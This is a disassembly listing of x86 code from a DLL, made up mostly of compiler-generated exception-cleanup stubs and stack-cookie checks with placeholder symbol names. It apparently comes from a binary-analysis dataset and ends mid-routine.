sub_1008215b
mov esi [ ebp - 0x10 ]
add esi 0x18
jmp sub_10028360
sub_10082166
mov esi [ ebp - 0x10 ]
add esi 0x30
jmp sub_1005e450
sub_10082171
mov esi [ ebp - 0x10 ]
add esi 0x64
jmp sub_1002f7a0
sub_1008217c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100821a0
mov ecx [ ebp - 0x8c ]
add ecx 0xc
jmp sub_10029c40
sub_100821ae
mov ecx [ ebp - 0x8c ]
add ecx 0x2c
jmp sub_10029c40
sub_100821bc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100821f0
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_100821f8
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082200
lea ecx [ ebp - 0x64 ]
jmp sub_10029c40
sub_10082208
lea ecx [ ebp - 0x80 ]
jmp sub_10029c40
sub_10082210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082240
lea ecx [ ebp - 0x318 ]
jmp sub_10029c40
sub_1008224b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x334 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082280
lea ecx [ ebp - 0x38 ]
jmp sub_10029c40
sub_10082288
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100822b0
mov eax [ ebp - 0x10 ]
jmp sub_10040d90
sub_100822b8
lea eax [ ebp - 0x14 ]
jmp sub_10044190
sub_100822c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100822e0
mov eax [ ebp - 0x64 ]
jmp sub_10040d90
sub_100822e8
lea eax [ ebp - 0x68 ]
jmp sub_10044190
sub_100822f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082320
mov eax [ ebp - 0x270 ]
jmp sub_10040d90
sub_1008232b
lea eax [ ebp - 0x278 ]
jmp sub_10044190
sub_10082336
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x288 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082360
mov eax [ ebp - 0x14 ]
jmp sub_10040d90
sub_10082368
lea eax [ ebp - 0x238 ]
jmp sub_10044190
sub_10082373
lea eax [ ebp - 0x240 ]
jmp sub_10044190
sub_1008237e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100823b0
mov eax [ ebp - 0x304 ]
jmp sub_10040d90
sub_100823bb
lea eax [ ebp - 0x2e4 ]
jmp sub_10044190
sub_100823c6
lea eax [ ebp - 0x2ec ]
jmp sub_10044190
sub_100823d1
lea ecx [ ebp - 0x2a4 ]
jmp sub_10029c40
sub_100823dc
lea ecx [ ebp - 0x26c ]
jmp sub_10029c40
sub_100823e7
lea ecx [ ebp - 0x234 ]
jmp sub_10029c40
sub_100823f2
lea eax [ ebp - 0x328 ]
jmp sub_10011310
sub_100823fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x32c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082430
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_10082441
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082460
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082480
lea esi [ ebp - 0x23c ]
jmp sub_1005e450
sub_1008248b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x248 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100824c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100824e0
mov eax [ ebp + 0x8 ]
jmp sub_100449b0
sub_100824e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082510
mov ecx [ ebp + 0x8 ]
add ecx 0x10
jmp sub_100096d0
sub_1008251b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082540
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082560
lea eax [ ebp - 0x1c ]
jmp sub_100449b0
sub_10082568
lea eax [ ebp - 0x1c ]
jmp sub_100449b0
sub_10082570
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082590
lea eax [ ebp - 0x1c ]
jmp sub_100449b0
sub_10082598
lea eax [ ebp - 0x1c ]
push eax
call sub_10005300
retn
sub_100825a2
lea eax [ ebp - 0x1c ]
jmp sub_100449b0
sub_100825aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100825d0
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10029c40
sub_100825db
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0xc ]
add ecx 0x60
jmp sub_10052d60
sub_100825f7
mov ecx [ ebp + 0xc ]
add ecx 0x18
jmp sub_10021500
sub_10082602
mov ecx [ ebp - 0x14 ]
jmp sub_1005f7e0
sub_1008260a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082630
lea ecx [ ebp - 0xac ]
jmp sub_10029c40
sub_1008263b
lea ecx [ ebp - 0xc8 ]
jmp sub_10029c40
sub_10082646
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf4 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082670
lea ecx [ ebp - 0x98 ]
jmp sub_10029c40
sub_1008267b
lea ecx [ ebp - 0xb4 ]
jmp sub_10029c40
sub_10082686
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100826b0
lea ecx [ ebp - 0x23c ]
jmp sub_10029c40
sub_100826bb
lea ecx [ ebp - 0x258 ]
jmp sub_10029c40
sub_100826c6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x274 ]
mov ecx [ edx - 0x278 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082700
lea ecx [ ebp - 0x50 ]
jmp sub_10029c40
sub_10082708
lea ecx [ ebp - 0xdc ]
jmp sub_10029c40
sub_10082713
lea ecx [ ebp - 0xc0 ]
jmp sub_10029c40
sub_1008271e
lea ecx [ ebp - 0x88 ]
jmp sub_10029c40
sub_10082729
lea ecx [ ebp - 0xa4 ]
jmp sub_10029c40
sub_10082734
lea ecx [ ebp - 0x6c ]
jmp sub_10029c40
sub_1008273c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082770
lea ecx [ ebp - 0x2b8 ]
jmp sub_10029c40
sub_1008277b
lea ecx [ ebp - 0x210 ]
jmp sub_10029c40
sub_10082786
lea ecx [ ebp - 0x29c ]
jmp sub_10029c40
sub_10082791
lea ecx [ ebp - 0xdc ]
jmp sub_10029c40
sub_1008279c
lea ecx [ ebp - 0x264 ]
jmp sub_10029c40
sub_100827a7
lea ecx [ ebp - 0x22c ]
jmp sub_10029c40
sub_100827b2
lea ecx [ ebp - 0x1f4 ]
jmp sub_10029c40
sub_100827bd
lea ecx [ ebp - 0x1bc ]
jmp sub_10029c40
sub_100827c8
lea ecx [ ebp - 0x184 ]
jmp sub_10029c40
sub_100827d3
lea ecx [ ebp - 0x14c ]
jmp sub_10029c40
sub_100827de
lea ecx [ ebp - 0x130 ]
jmp sub_10029c40
sub_100827e9
lea ecx [ ebp - 0x114 ]
jmp sub_10029c40
sub_100827f4
lea ecx [ ebp - 0x248 ]
jmp sub_10029c40
sub_100827ff
lea ecx [ ebp - 0x1d8 ]
jmp sub_10029c40
sub_1008280a
lea ecx [ ebp - 0x280 ]
jmp sub_10029c40
sub_10082815
lea ecx [ ebp - 0x1a0 ]
jmp sub_10029c40
sub_10082820
lea ecx [ ebp - 0xf8 ]
jmp sub_10029c40
sub_1008282b
lea ecx [ ebp - 0x168 ]
jmp sub_10029c40
sub_10082836
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2cc ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082860
mov ecx [ ebp - 0x6c ]
add ecx 0x4
jmp sub_10029c40
sub_1008286b
mov ecx [ ebp - 0x6c ]
add ecx 0x20
jmp sub_10029c40
sub_10082876
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_1008287e
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10082886
mov ecx [ ebp - 0x6c ]
add ecx 0x40
jmp sub_10029c40
sub_10082891
mov ecx [ ebp - 0x6c ]
add ecx 0x5c
jmp sub_10029c40
sub_1008289c
mov ecx [ ebp - 0x6c ]
add ecx 0x78
jmp sub_10029c40
sub_100828a7
mov ecx [ ebp - 0x6c ]
add ecx 0x94
jmp sub_10029c40
sub_100828b5
mov ecx [ ebp - 0x6c ]
add ecx 0xb0
jmp sub_10029c40
sub_100828c3
mov ecx [ ebp - 0x6c ]
add ecx 0xf0
jmp sub_1001e530
sub_100828d1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082900
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_10082919
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082921
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082950
lea ecx [ ebp - 0x9c ]
jmp sub_10029c40
sub_1008295b
lea ecx [ ebp - 0x144 ]
jmp sub_10029c40
sub_10082966
lea ecx [ ebp - 0xf0 ]
jmp sub_10029c40
sub_10082971
lea ecx [ ebp - 0x80 ]
jmp sub_10029c40
sub_10082979
lea ecx [ ebp - 0x160 ]
jmp sub_10029c40
sub_10082984
lea ecx [ ebp - 0x17c ]
jmp sub_10029c40
sub_1008298f
lea ecx [ ebp - 0x128 ]
jmp sub_10029c40
sub_1008299a
lea ecx [ ebp - 0xd4 ]
jmp sub_10029c40
sub_100829a5
lea ecx [ ebp - 0xb8 ]
jmp sub_10029c40
sub_100829b0
lea ecx [ ebp - 0x64 ]
jmp sub_10029c40
sub_100829b8
lea ecx [ ebp - 0x198 ]
jmp sub_10029c40
sub_100829c3
lea ecx [ ebp - 0x10c ]
jmp sub_10029c40
sub_100829ce
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1b0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082a00
lea ecx [ ebp - 0x50 ]
jmp sub_10029c40
sub_10082a08
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082a10
lea ecx [ ebp - 0x6c ]
jmp sub_10029c40
sub_10082a18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082a40
mov eax [ ebp - 0x40 ]
push eax
call sub_1006591f
pop ecx
retn
sub_10082a4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082a70
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082a78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082aa0
lea ecx [ ebp - 0xd4 ]
jmp sub_10029c40
sub_10082aab
lea ecx [ ebp - 0xb8 ]
jmp sub_10029c40
sub_10082ab6
lea ecx [ ebp - 0x80 ]
jmp sub_10029c40
sub_10082abe
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10082ac6
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082ace
lea ecx [ ebp - 0x9c ]
jmp sub_10029c40
sub_10082ad9
lea ecx [ ebp - 0x64 ]
jmp sub_10029c40
sub_10082ae1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd8 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082b10
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b18
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_10082b23
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b2b
lea ecx [ ebp - 0x90 ]
jmp sub_10061060
sub_10082b36
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b3e
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b46
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_10082b4e
lea ecx [ ebp - 0x74 ]
jmp sub_10061060
sub_10082b56
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b5e
lea ecx [ ebp - 0x3c ]
jmp sub_10061060
sub_10082b66
mov ecx [ ebp - 0x138 ]
jmp sub_10061060
sub_10082b71
mov ecx [ ebp - 0x134 ]
jmp sub_10061060
sub_10082b7c
mov ecx [ ebp - 0x144 ]
jmp sub_10061060
sub_10082b87
lea esi [ ebp - 0x12c ]
jmp sub_10054dd0
sub_10082b92
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x148 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082bc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082be0
lea ecx [ ebp - 0x234 ]
jmp sub_10029c40
sub_10082beb
lea ecx [ ebp - 0x250 ]
jmp sub_10029c40
sub_10082bf6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x254 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082c20
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082c28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082c50
lea ecx [ ebp - 0x3f4 ]
jmp sub_10029c40
sub_10082c5b
lea ecx [ ebp - 0x42c ]
jmp sub_10029c40
sub_10082c66
lea ecx [ ebp - 0x448 ]
jmp sub_10029c40
sub_10082c71
lea ecx [ ebp - 0x3bc ]
jmp sub_10029c40
sub_10082c7c
mov eax [ ebp - 0x4d8 ]
jmp sub_10040d90
sub_10082c87
lea eax [ ebp - 0x4c0 ]
jmp sub_10044190
sub_10082c92
lea eax [ ebp - 0x4c8 ]
jmp sub_10044190
sub_10082c9d
lea ecx [ ebp - 0x410 ]
jmp sub_10029c40
sub_10082ca8
lea ecx [ ebp - 0x4b8 ]
jmp sub_10029c40
sub_10082cb3
lea ecx [ ebp - 0x480 ]
jmp sub_10029c40
sub_10082cbe
lea ecx [ ebp - 0x49c ]
jmp sub_10029c40
sub_10082cc9
lea ecx [ ebp - 0x464 ]
jmp sub_10029c40
sub_10082cd4
lea ecx [ ebp - 0x3d8 ]
jmp sub_10029c40
sub_10082cdf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4ec ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082d10
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082d18
lea ecx [ ebp - 0x64 ]
jmp sub_10029c40
sub_10082d20
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10082d28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082d50
lea ecx [ ebp - 0xc8 ]
jmp sub_10029c40
sub_10082d5b
lea ecx [ ebp - 0x100 ]
jmp sub_10029c40
sub_10082d66
lea ecx [ ebp - 0xe4 ]
jmp sub_10029c40
sub_10082d71
lea ecx [ ebp - 0x74 ]
jmp sub_10029c40
sub_10082d79
lea ecx [ ebp - 0x90 ]
jmp sub_10029c40
sub_10082d84
lea ecx [ ebp - 0xac ]
jmp sub_10029c40
sub_10082d8f
lea ecx [ ebp - 0x74 ]
jmp sub_10029c40
sub_10082d97
lea ecx [ ebp - 0xac ]
jmp sub_10029c40
sub_10082da2
lea ecx [ ebp - 0x90 ]
jmp sub_10029c40
sub_10082dad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x11c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082de0
lea ecx [ ebp - 0x9c ]
jmp sub_10029c40
sub_10082deb
lea ecx [ ebp - 0xd4 ]
jmp sub_10029c40
sub_10082df6
lea ecx [ ebp - 0xb8 ]
jmp sub_10029c40
sub_10082e01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xec ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082e30
mov eax [ ebp - 0x3c ]
push eax
call sub_1006591f
pop ecx
retn
sub_10082e3b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10024145
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082e70
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10082e78
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10082e80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082eb0
mov eax [ ebp - 0x9c ]
push eax
call sub_1006591f
pop ecx
retn
sub_10082ebe
mov ecx [ ebp - 0x9c ]
jmp sub_10029c40
sub_10082ec9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082f00
lea edi [ ebp - 0xd4 ]
jmp sub_1002eb30
sub_10082f0b
lea edi [ ebp - 0xd4 ]
jmp sub_1002eb30
sub_10082f16
lea edi [ ebp - 0xd8 ]
jmp sub_1002eb30
sub_10082f21
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_10082f29
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x100 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082f60
lea ecx [ ebp - 0x324 ]
jmp sub_1001e530
sub_10082f6b
lea esi [ ebp - 0x2f8 ]
jmp sub_10054dd0
sub_10082f76
mov eax [ ebp - 0x304 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x304 ] 0xfffffffe
mov ebx [ ebp - 0x308 ]
jmp sub_1006c7f0
sub_10082f98
lea ecx [ ebp - 0x274 ]
jmp sub_10061060
sub_10082fa3
mov eax [ ebp - 0x310 ]
push eax
mov ecx [ ebp - 0x314 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_10082fba
mov eax [ ebp - 0x314 ]
push eax
mov ecx [ ebp - 0x310 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_10082fd1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x32c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083000
mov esi [ ebp - 0x44 ]
jmp sub_10023cd0
sub_10083008
mov ecx [ ebp - 0x44 ]
add ecx 0x94
jmp sub_10029c40
sub_10083016
mov esi [ ebp - 0x44 ]
add esi 0xb4
jmp sub_1002abe0
sub_10083024
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_1008302c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083060
mov esi [ ebp + 0x8 ]
jmp sub_10023cd0
sub_10083068
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10029c40
sub_10083076
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100830a0
mov esi [ ebp + 0x8 ]
jmp sub_10023cd0
sub_100830a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100830d0
lea ecx [ ebp - 0x3f0 ]
jmp sub_10029c40
sub_100830db
lea ecx [ ebp - 0x460 ]
jmp sub_10029c40
sub_100830e6
lea ecx [ ebp - 0x444 ]
jmp sub_10061060
sub_100830f1
lea ecx [ ebp - 0x460 ]
jmp sub_10061060
sub_100830fc
lea ecx [ ebp - 0x428 ]
jmp sub_10061060
sub_10083107
lea ecx [ ebp - 0x40c ]
jmp sub_10029c40
sub_10083112
lea ecx [ ebp - 0x40c ]
jmp sub_10029c40
sub_1008311d
lea ecx [ ebp - 0x47c ]
jmp sub_10029c40
sub_10083128
lea ecx [ ebp - 0x498 ]
jmp sub_10029c40
sub_10083133
lea ecx [ ebp - 0x498 ]
jmp sub_10029c40
sub_1008313e
lea ecx [ ebp - 0x47c ]
jmp sub_10029c40
sub_10083149
lea ecx [ ebp - 0x498 ]
jmp sub_10029c40
sub_10083154
lea ecx [ ebp - 0x47c ]
jmp sub_10029c40
sub_1008315f
lea ecx [ ebp - 0x47c ]
jmp sub_10029c40
sub_1008316a
lea ecx [ ebp - 0x40c ]
jmp sub_10029c40
sub_10083175
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100831a0
lea esi [ ebp - 0x24 ]
jmp sub_10028360
sub_100831a8
lea ecx [ ebp - 0x84 ]
jmp sub_10029c40
sub_100831b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100831e0
lea ecx [ ebp - 0x84 ]
jmp sub_10029c40
sub_100831eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083220
lea esi [ ebp - 0x8e0 ]
jmp j_sub_10005940
sub_1008322b
lea esi [ ebp - 0x918 ]
jmp j_sub_10005940
sub_10083236
lea esi [ ebp - 0x8e8 ]
jmp j_sub_10005940
sub_10083241
lea esi [ ebp - 0x908 ]
jmp j_sub_10005940
sub_1008324c
lea esi [ ebp - 0x8f8 ]
jmp j_sub_10005940
sub_10083257
lea esi [ ebp - 0x900 ]
jmp j_sub_10005940
sub_10083262
lea esi [ ebp - 0x8f0 ]
jmp j_sub_10005940
sub_1008326d
lea esi [ ebp - 0x8d8 ]
jmp j_sub_10005940
sub_10083278
lea esi [ ebp - 0x920 ]
jmp j_sub_10005940
sub_10083283
lea esi [ ebp - 0x910 ]
jmp j_sub_10005940
sub_1008328e
lea esi [ ebp - 0x928 ]
jmp j_sub_10005940
sub_10083299
lea esi [ ebp - 0x938 ]
jmp j_sub_10005940
sub_100832a4
lea ecx [ ebp - 0x7ec ]
jmp sub_10029c40
sub_100832af
lea ecx [ ebp - 0x808 ]
jmp sub_10029c40
sub_100832ba
lea ecx [ ebp - 0x824 ]
jmp sub_10029c40
sub_100832c5
lea ecx [ ebp - 0x840 ]
jmp sub_10029c40
sub_100832d0
lea ecx [ ebp - 0x894 ]
jmp sub_10029c40
sub_100832db
lea ecx [ ebp - 0x878 ]
jmp sub_10029c40
sub_100832e6
lea ecx [ ebp - 0x8b0 ]
jmp sub_10029c40
sub_100832f1
lea ecx [ ebp - 0x85c ]
jmp sub_10029c40
sub_100832fc
lea ecx [ ebp - 0x8cc ]
jmp sub_10029c40
sub_10083307
lea ecx [ ebp - 0x840 ]
jmp sub_10029c40
sub_10083312
lea ecx [ ebp - 0x824 ]
jmp sub_10029c40
sub_1008331d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x93c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083350
lea ecx [ ebp - 0x64 ]
jmp sub_10029c40
sub_10083358
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10024145
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083380
lea ecx [ ebp - 0x148 ]
